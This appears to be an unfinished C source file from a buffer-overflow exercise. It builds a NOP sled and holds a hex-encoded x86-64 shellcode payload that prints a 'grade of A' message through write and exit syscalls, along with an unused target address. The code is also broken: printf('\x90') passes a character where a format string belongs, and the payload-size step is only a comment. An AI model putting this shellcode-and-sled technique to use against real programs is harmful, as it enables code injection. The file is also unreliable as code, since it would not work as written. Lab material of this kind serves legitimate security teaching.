#include <stdio.h>

int main(void){

    unsigned char byte;
    char hex[3];
    while (scanf("%2s", hex) == 1) {
        sscanf(hex, "%hhx", &byte);
        putchar(byte);
    }

    for (int i = 0; i < 100; i++){
        printf('\x90');
    }
    char *payload = "eb 4c 54 68 61 6e 6b 20 79 6f 75 2c 20 58 58 58 58 58 2e 20 20 49 20 72 65 63 6f 6d 6d 65 6e 64 20 74 68 61 74 20 79 6f 75 20 67 65 74 20 61 20 67 72 61 64 65 20 6f 66 20 41 20 6f 6e 20 74 68 69 73 20 61 73 73 69 67 6e 6d 65 6e 74 2e b0 01 40 b7 01 48 8d 35 a8 ff ff ff b2 4c 0f 05 b0 e7 48 31 ff 0f 05";
    // calculate payload size

    int addr = 0x40000;

}